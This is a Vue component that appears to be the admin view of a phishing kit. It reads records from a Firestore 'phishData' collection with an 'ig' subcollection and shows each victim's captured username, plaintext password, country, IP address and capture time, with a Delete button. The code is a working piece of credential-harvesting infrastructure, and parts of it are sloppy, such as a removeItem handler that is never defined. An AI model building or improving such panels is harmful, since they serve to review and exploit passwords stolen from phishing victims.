<template>
  <div class="p-1 dark:bg-gray-800 min-h-screen border-2 border-gray-200 border-dashed rounded-lg dark:border-gray-700 mt-14">

<div class="relative max-h-screen overflow-x-auto overflow-y-scroll shadow-md sm:rounded-lg">
    <table class="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
        <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
            <tr>
                <th scope="col" class="px-6 py-6">
                    #
                </th>
                <th scope="col" class="px-6 py-6">
                    Username
                </th>
                <th scope="col" class="px-6 py-6">
                    password
                </th>
                <th scope="col" class="px-6 py-6">
                   Country
                </th>
                <th scope="col" class="px-6 py-6">
                    Ip Address
                </th>
                <th scope="col" class="px-6 py-6">
                    Time
                </th>
                <th scope="col" class="px-6 py-6">
                    Action
                </th>
            </tr>
        </thead>
         <tbody>



        <tr v-for="(item, index) in tableData" :key="index" class="bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600">
                <td class="px-6 py-4">
                    {{ tableData.length - index }}
                </td>
                <th scope="row" class="px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white">
                    {{ item.email }}
                </th>
                <td class="px-6 py-4">
                    {{ item.pass }}
                </td>
                 <td class="px-6 py-4">
                    {{ item.country }}
                </td>
                <td class="px-6 py-4">
                    {{ item.ipaddress }}
                </td>
                <td class="px-6 py-4">
                    {{ item.createdAt }}
                </td>

                <td class="flex items-center px-6 py-4">

            <button @click="removeItem(index)" class="w-full justify-center text-red-600 inline-flex items-center hover:text-white border border-red-600 hover:bg-red-600 focus:ring-4 focus:outline-none focus:ring-red-300 font-medium rounded-lg text-sm px-5 py-1 text-center dark:border-red-500 dark:text-red-500 dark:hover:text-white dark:hover:bg-red-600 dark:focus:ring-red-900">
                <svg aria-hidden="true" class="w-5 h-5 mr-1 -ml-1" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                Delete
            </button>
                </td>
            </tr>
            
        </tbody>

    </table>
</div>

</div>

</template>

<script>
import { collection, query, orderBy, getDocs } from 'firebase/firestore';
import { db } from '/src/firebase/index.js';
import { format } from 'date-fns';

export default {
  name: 'TableBody',
  props: {
    childData: {
      type: String,
      required: true,
    },
  },
  data() {
    return {
      tableData: [],
      savedId: null, // Add savedId to the component's data
    };
  },
  watch: {
    // Watch for changes in the childData prop and update savedId accordingly
    childData: {
      immediate: true,
      handler(newValue) {
        this.savedId = newValue;
        this.fetchSubcollectionData();
      },
    },
  },
  methods: {
    async fetchSubcollectionData() {
      // Check if savedId is available before attempting to fetch data
      if (this.savedId) {
        try {
          const subCollectionRef = collection(db, 'phishData', this.savedId, 'ig');
          const q = query(subCollectionRef, orderBy('createdAt', 'desc'));
          const snapshot = await getDocs(q);

          // Extract and format the documents
          const documents = snapshot.docs.map((doc) => {
            const createdAt = doc.data().createdAt?.toDate();
            return {
              ...doc.data(),
              createdAt: createdAt ? format(createdAt, 'yyyy-MM-dd HH:mm:ss') : null,
            };
          });

          // Sort the documents by timestamp
          documents.sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));

          // Update the Vue component state
          this.tableData = documents;
        } catch (error) {
          console.error('Error fetching subcollection data:', error);
          // Handle the error as needed
        }
      }
    },
  },
};
</script>
